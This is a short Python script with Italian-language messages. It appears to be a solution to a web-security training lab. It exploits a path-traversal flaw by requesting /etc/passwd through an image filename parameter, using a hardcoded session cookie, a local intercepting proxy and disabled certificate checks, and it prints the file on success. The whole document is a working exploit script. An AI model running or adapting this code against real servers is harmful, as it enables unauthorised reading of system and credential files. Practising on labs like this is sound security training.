import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


proxies = {'http' :'http://127.0.0.1:8080' , 'https' : 'http://127.0.0.1:8080'}


def perform_request(url, exploit):
    uri = "/image?filename="+exploit
    cookies = {'session' : 'wfRoz5PxplLQO6fNOQJHgXRSDGkBJQIA'}
    r = requests.get(url + uri, cookies=cookies, verify=False, proxies=proxies)
    return r



def directory_traversal_exploit(url):
    exploit = "/etc/passwd"
    response = perform_request(url,exploit)
    if response.status_code == 200:
        print("[+] Exploit avvenuto con successo!\n")
        print(response.text)
        return True
    else:
        print("[-] Exploit falito!")
        return False


def main():
    if len(sys.argv) != 2:
        print("[-] Utilizzo: %s <url>" % sys.argv[0])
        print("[-] Esempio: %s www.example.com" % sys.argv[0])
        sys.exit()

    url = sys.argv[1].strip()
    directory_traversal_exploit(url)



if __name__ == "__main__":
    main()